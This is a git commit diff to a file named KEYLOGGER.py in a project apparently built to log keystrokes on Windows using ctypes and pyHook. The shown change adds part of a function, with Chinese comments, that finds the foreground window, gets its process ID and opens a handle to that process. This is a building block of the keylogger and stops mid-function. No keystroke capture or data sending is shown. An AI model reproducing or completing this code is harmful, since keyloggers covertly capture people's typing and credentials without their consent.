b2af62f3d30af9e5490beb66fc80bc7f33350c41
Handsome2Hu <370981805@qq.com>
2017-09-15 16:39:14 +0800

    emmmm

--- KeyLogger/KEYLOGGER.py
+++ KeyLogger/KEYLOGGER.py
@@ -1,3 +1,5 @@
+#coding=utf-8
+
 from ctypes import *
 import pythoncom
 import pyHook
@@ -8,7 +10,22 @@ kernel32        = windll.kernel32
 psapi           = windll.psapi
 current_window = None
 
-#def get_current_process():
-    #
-hwnd = user32.GetForegroundWindow()
+def get_current_process():
+    #获取前台窗口句柄
+    hwnd = user32.GetForegroundWindow()
+    
+    #获取进程ID
+    pid = c_ulong(0)
+    user32.GetWindowThreadProcessId(hwnd,byref(pid))
+    
+    #保存当前的进程
+    process_id = "%d" % pid.value
+    
+    #申请内存
+    executable = create_string_buffer("\x00" * 512)
+    
+    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+    
+    
+    
 
